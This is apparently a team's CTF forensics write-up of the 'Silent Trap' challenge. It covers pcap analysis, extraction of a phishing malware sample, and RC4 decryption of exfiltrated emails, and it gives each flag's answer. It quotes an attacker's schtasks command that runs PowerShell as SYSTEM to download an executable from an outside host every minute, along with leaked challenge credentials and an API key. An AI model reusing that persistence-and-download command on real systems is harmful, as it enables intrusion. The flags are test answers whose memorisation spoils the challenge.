# Cyber Apocalypse CTF 2025: Silent Trap

## Team H-T8
Big credits to the H-T8 team. 

Members: 
ilpakka, ExcelAtSheets, ridicculus, lansiri, Mizard, EetHeet, d4ybreak

## Official Description
A critical incident has occurred in Tales from Eldoria, trapping thousands of players in the virtual world with no way to log out. The cause has been traced back to Malakar, a mysterious entity that launched a sophisticated attack, taking control of the developers' and system administrators' computers. With key systems compromised, the game is unable to function properly, which is why players remain trapped in Eldoria. Now, you must investigate what happened and find a way to restore the system, freeing yourself from the game before it's too late.

### Files provided
- capture.pcapng: pcapng capture file - version 1.0 - 1.7M Feb 24 09:11


### Tools used
- Wireshark (and tshark)
- NetworkMiner
- ILSpy / AvaloniaILSpy

## Flags

### Preparation

I started by quickly glancing over all the information that WireShark was able to show me, 
while trying to take mental notes of various frames that seemed suspicious or unusual. 
There were 3696 frames in total. Too many frames to go through in the context of the CTF timeframe, but still manageable in a pinch. 

### 1. What is the subject of the first email that the victim opened and replied to?
To cut down amount of frames to go through, I set the filter for http requests to start things off. 

<img src="https://github.com/user-attachments/assets/28594d5a-f23e-4cde-ac75-ef03359a1018" width="500"> <br/>

After filtering with ```http```, there was 86 frames left to go through. HTTP methods mainly consisted of GET and POST methods, 
with more GET methods in the earlier frames and more POST methods in the later frames.  
After filtering with ```http contains "GET"```, the info becomes very easy to read through (21 frames). 

<img src="https://github.com/user-attachments/assets/e84721c4-c973-4140-bad5-fd36bd91991c" width="500"> <br/>

After finding the first frame with ```&_action=compose```, I checked the HTTP Stream (```Right click -> Follow -> HTTP Stream```) to look for more information. 

<img src="https://github.com/user-attachments/assets/056219c6-2eec-4729-8918-1818dd4b5413" width="500"> <br/>

After scrolling through the HTTP stream, I found the subject of the email. 

<img src="https://github.com/user-attachments/assets/5cc23df9-4918-4a70-a44c-e1022c2753d3" width="500"> <br/>

Flag #1: ```Game Crash on Level 5```

### 2. On what date and time was the suspicious email sent? (Format: YYYY-MM-DD_HH:MM) (for example: 1945-04-30_12:34)

I was able to find the flag using WireShark but it is much more straightforward process when you also use NetworkMiner. 
To use the provided .pcapng file, I had to save the file into .pcap format using WireShark since the free version of NetworkMiner only supports .pcap files. 

Using NetworkMiner you can see in the file tab that there was a suspicious file ```Eldoria_Balance_Issue_Report.zip``` downloaded on frame 607. 

<img src="https://github.com/user-attachments/assets/ba3c471f-c85e-4c04-9d4e-3c3169daa3a7" width="500"> <br/>

Above it, is a .html file that you can open to read the email and it's contents. 

<img src="https://github.com/user-attachments/assets/f61f263f-ee7b-4e36-a1d6-e927668ff0ba" width="500"> <br/>

There you can clearly see the date it was sent along with the archive password ```eldoriaismylife```

Flag #2: ```2025-02-24_15:46```

### 3. What is the MD5 hash of the malware file?

Beware that the file in question is a malware so you do not want to run it in a non-controlled environment. 

After moving the file into Linux environment I extracted the file from .zip and ran md5sum to get the MD5 hash of the malware. 

```unzip -P eldoriaismylife Eldoria_Balance_Issue_Report.zip```

```md5sum Eldoria_Balance_Issue_Report.pdf.exe```

<img src="https://github.com/user-attachments/assets/5fff2629-0d9a-45b2-9100-47a57314b134" width="500"> <br/>

Flag #3: ```c0b37994963cc0aadd6e78a256c51547```

### 4. What credentials were used to log into the attacker's mailbox? (Format: username:password)

To get the credentials, you can simply check the NetworkMiner Credentials tab. 

<img src="https://github.com/user-attachments/assets/5062dfe6-a63a-4e68-892c-0b797d9c0281" width="500"> <br/>

It is also possible to get the credentials with WireShark by filtering with ```IMAP``` to see the credentials in plaintext. 

<img src="https://github.com/user-attachments/assets/94425a64-a903-44a1-a67c-e337cc440076" width="500"> <br/>

Flag #4: ```proplayer@email.com:completed```

### Pitstop: Examining the malware and decrypting the emails

For the last two flags, you will need to examine the malware. 

To examine the malware, I used the AvaloniaILSpy (a Linux port of ILSpy). 
What you need will need to find rest of the flags are the encryption logic and the xor key. 
(You can also find the login credentials we already found earlier within the code. ) 

<img src="https://github.com/user-attachments/assets/6c8af0a0-137a-4149-ac59-2d79389593af" width="500"> <br/>

<img src="https://github.com/user-attachments/assets/f6357d81-8c27-41a3-9f03-b144f589b532" width="500"> <br/>

Earlier while examining the files in NetworkMiner, you could also have noticed the 14 .eml files that were also found within the .pcap file. 
EML is an electronic mail format, basically email in plaintext. 

Once you open them up, in notepad for example you can see the emails contents. For example: ```2212025531.eml```

```
From: dev-support
Subject: 2/21/2025 5:31:40 PM_report_U1VQUE9SVEhVQl9kZXYtc3VwcG9ydF9NaWNyb3NvZnQgV2luZG93cyBOVCA2LjIuOTIwMC4w

VGiPTdHXQGP876EbMX2FJhm3ZazpvA8aO8jT1uC8xPhDZq/Np5oZQnHUpKxc36FHBznusaFRsSPtnJzlC4qyGNxcWMCIs1qdVzygFbDj0se4vntsvpU9rKvQPLcPERIjLB36+ws5PVmzVsnuxNmgUPegSj+VPrRfrcHkaE0PKHVKjXgoGdmRJd2PDG7SWRcBDwNp8EC7UfDTqZp7EDWJYUJuBLfFYh4tpc/MCfKw++nXu5YZ/FWE9pkrWq4=
```

There are two obvious encrypted parts. One in the subject and one in the contents of the email. 

```
echo "U1VQUE9SVEhVQl9kZXYtc3VwcG9ydF9NaWNyb3NvZnQgV2luZG93cyBOVCA2LjIuOTIwMC4w" | base64 -d
SUPPORTHUB_dev-support_Microsoft Windows NT 6.2.9200.0
```

```
echo "VGiPTdHXQGP876EbMX2FJhm3ZazpvA8aO8jT1uC8xPhDZq/Np5oZQnHUpKxc36FHBznusaFRsSPtnJzlC4qyGNxcWMCIs1qdVzygFbDj0se4vntsvpU9rKvQPLcPERIjLB36+ws5PVmzVsnuxNmgUPegSj+VPrRfrcHkaE0PKHVKjXgoGdmRJd2PDG7SWRcBDwNp8EC7UfDTqZp7EDWJYUJuBLfFYh4tpc/MCfKw++nXu5YZ/FWE9pkrWq4=" | base64 -d
Th�M��@c���}�&�e���▒;�������Cf��BqԤ�\ߡG9Q�#휜�
                                               ��▒�\X���Z�W<����Ǹ�{l��=���<�#,��
                                                                                9=Y�V���٠P��J?�>�_���hM(uJ�x(%ݏ
                                                                                                               n�Yi�@�Q�ө�{5�aBn��b-��� ����׻��U���+Z�        
```

Decrypting the subject with base64 results into readable plaintext but decrypting the contents results into unreadable gibberish. 

After some ChatGPT prompting I was able to get usable python script that could decode Base64 and RC4 encryption. 

```
# RC4 decryption function
def rc4(key, data):
    key_length = len(key)
    state = list(range(256))
    key_schedule = [0] * 256

    # Key scheduling
    j = 0
    for i in range(256):
        j = (j + state[i] + key[i % key_length]) % 256
        state[i], state[j] = state[j], state[i]

    # Pseudo-random generation
    i = 0
    j = 0
    output = []
    for byte in data:
        i = (i + 1) % 256
        j = (j + state[i]) % 256
        state[i], state[j] = state[j], state[i]
        output.append(byte ^ state[(state[i] + state[j]) % 256])

    return bytes(output)

# Base64 string to be decrypted
base64_data = "VGiPTdHXQGP876EbMX2FJhm3ZazpvA8aO8jT1uC8xPhDZq/Np5oZQnHUpKxc36FHBznusaFRsSPtnJzlC4qyGNxcWMCIs1qdVzygFbDj0se4vntsvpU9rKvQPLcPERIjLB36+ws5PVmzVsnuxNmgUPegSj+VPrRfrcHkaE0PKHVKjXgoGdmRJd2PDG7SWRcBDwNp8EC7UfDTqZp7EDWJYUJuBLfFYh4tpc/MCfKw++nXu5YZ/FWE9pkrWq4="

# XOR key as a list of integers
key = [
    168, 115, 174, 213, 168, 222, 72, 36, 91, 209, 242, 128, 69, 99, 195, 164, 238, 182, 67, 92,
    7, 121, 164, 86, 121, 10, 93, 4, 140, 111, 248, 44, 30, 94, 48, 54, 45, 100, 184, 54,
    28, 82, 201, 188, 203, 150, 123, 163, 229, 138, 177, 51, 164, 232, 86, 154, 179, 143, 144, 22,
    134, 12, 40, 243, 55, 2, 73, 103, 99, 243, 236, 119, 9, 120, 247, 25, 132, 137, 67, 66,
    111, 240, 108, 86, 85, 63, 44, 49, 241, 6, 3, 170, 131, 150, 53, 49, 126, 72, 60, 36,
    144, 248, 55, 10, 241, 208, 163, 217, 49, 154, 206, 227, 25, 99, 18, 144, 134, 169, 237, 100,
    117, 22, 11, 150, 157, 230, 173, 38, 72, 99, 129, 30, 220, 112, 226, 56, 16, 114, 133, 22,
    96, 1, 90, 72, 162, 38, 143, 186, 35, 142, 128, 234, 196, 239, 134, 178, 205, 229, 121, 225,
    246, 232, 205, 236, 254, 152, 145, 98, 126, 29, 217, 74, 177, 142, 19, 190, 182, 151, 233, 157,
    76, 74, 104, 155, 79, 115, 5, 18, 204, 65, 254, 204, 118, 71, 92, 33, 58, 112, 206, 151,
    103, 179, 24, 164, 219, 98, 81, 6, 241, 100, 228, 190, 96, 140, 128, 1, 161, 246, 236, 25,
    62, 100, 87, 145, 185, 45, 61, 143, 52, 8, 227, 32, 233, 37, 183, 101, 89, 24, 125, 203,
    227, 9, 146, 156, 208, 206, 194, 134, 194, 23, 233, 100, 38, 158, 58, 159
]

# Decode the base64 string
decoded_data = base64.b64decode(base64_data)

# Decrypt the data using RC4 with the provided key
decrypted_data = rc4(key, decoded_data)

# Output the decrypted data to a .txt file
with open("decrypted_output01.txt", "wb") as f:
    f.write(decrypted_data)

print("Decryption complete. The decrypted data is saved to 'decrypted_output01.txt'.")
```

<img src="https://github.com/user-attachments/assets/ac544510-b091-45b9-9ee8-0862a529f230" width="500"> <br/>

<img src="https://github.com/user-attachments/assets/a8326b50-151e-4d1e-8358-947cdbf2babe" width="500"> <br/>


### 5. What is the name of the task scheduled by the attacker?

Decrypted outputs were mostly about system information and things that were being run on the target computed. 
After out through the outputs, I found the one with schtasks (which is used to schedule tasks in Windows). 



```
Microsoft Windows [Version 10.0.19045.5487]
(c) Microsoft Corporation. All rights reserved.

C:\Users\dev-support\Desktop>schtasks /create /tn Synchronization /tr "powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://www.mediafire.com/view/wlq9mlfrl0nlcuk/rakalam.exe/file -OutFile C:\Temp\rakalam.exe" /sc minute /mo 1 /ru SYSTEM

C:\Users\dev-support\Desktop>
```

<img src="https://github.com/user-attachments/assets/6bf7d9ab-b083-4b86-97bb-bc9425bb8903" width="500"> <br/>

Flag #5: ```Synchronization```


### 6. What is the API key leaked from the highly valuable file discovered by the attacker?

The final flag was found in another decrypted .eml file. 

```
Microsoft Windows [Version 10.0.19045.5487]
(c) Microsoft Corporation. All rights reserved.

C:\Users\dev-support\Desktop>more C:\backups\credentials.txt
[Database Server]
host=db.internal.korptech.net
username=dbadmin
password=rY?ZY_65P4V0

[Game API]
host=api.korptech.net
api_key=sk-3498fwe09r8fw3f98fw9832fw

[SSH Access]
host=dev-build.korptech.net
username=devops
password=BuildServer@92|7Gy1lz'Xb
port=2022

C:\Users\dev-support\Desktop>
```




<img src="https://github.com/user-attachments/assets/901af2b6-a36c-49c5-9977-58f760ccfe5f" width="500"> <br/>

Flag #6: ```sk-3498fwe09r8fw3f98fw9832fw```



## Decrypted Files: 

[decrypted_output01.txt](https://github.com/user-attachments/files/19443085/decrypted_output01.txt)

[decrypted_output02.txt](https://github.com/user-attachments/files/19443086/decrypted_output02.txt)

[decrypted_output03.txt](https://github.com/user-attachments/files/19443087/decrypted_output03.txt)

[decrypted_output04.txt](https://github.com/user-attachments/files/19443088/decrypted_output04.txt)

[decrypted_output05.txt](https://github.com/user-attachments/files/19443089/decrypted_output05.txt)

[decrypted_output06.txt](https://github.com/user-attachments/files/19443090/decrypted_output06.txt)

[decrypted_output07.txt](https://github.com/user-attachments/files/19443092/decrypted_output07.txt)

[decrypted_output08.txt](https://github.com/user-attachments/files/19443093/decrypted_output08.txt)

[decrypted_output09.txt](https://github.com/user-attachments/files/19443096/decrypted_output09.txt)

[decrypted_output10.txt](https://github.com/user-attachments/files/19443097/decrypted_output10.txt)

[decrypted_output11.txt](https://github.com/user-attachments/files/19443098/decrypted_output11.txt)

[decrypted_output12.txt](https://github.com/user-attachments/files/19443099/decrypted_output12.txt)

[decrypted_output13.txt](https://github.com/user-attachments/files/19443100/decrypted_output13.txt)

[decrypted_output14.txt](https://github.com/user-attachments/files/19443101/decrypted_output14.txt)
